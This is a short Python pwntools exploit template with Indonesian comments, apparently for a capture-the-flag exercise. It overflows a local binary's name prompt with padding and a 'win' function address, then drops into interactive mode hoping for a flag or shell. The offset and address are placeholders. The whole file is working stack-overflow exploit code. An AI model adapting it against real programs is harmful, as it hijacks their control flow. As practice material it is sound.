from pwn import *

# Ganti ini dengan nilai yang benar setelah Anda hitung di GDB
OFFSET = 64  # <-- GANTI INI (contoh)
WIN_ADDRESS = 0x08049182  # <-- GANTI INI (contoh alamat fungsi win)

# Buat payload
# 'b"A" * OFFSET' -> Membuat padding
# 'p32(WIN_ADDRESS)' -> Mengemas alamat agar bisa dikirim (sesuaikan p32/p64)
payload = (b"A" * OFFSET) + p32(WIN_ADDRESS)

# Mulai proses
p = process('./run')

# Terima output "Inputkan nama anda: "
# Ini penting agar program siap menerima input Anda
p.recvuntil(b"nama anda: ")

# KIRIM PAYLOAD EKSPLOIT!
p.sendline(payload)

# Sekarang, masuk ke mode interaktif
# Jika eksploit berhasil, Anda mungkin akan melihat flag tercetak,
# atau Anda akan mendapatkan shell.
p.interactive()
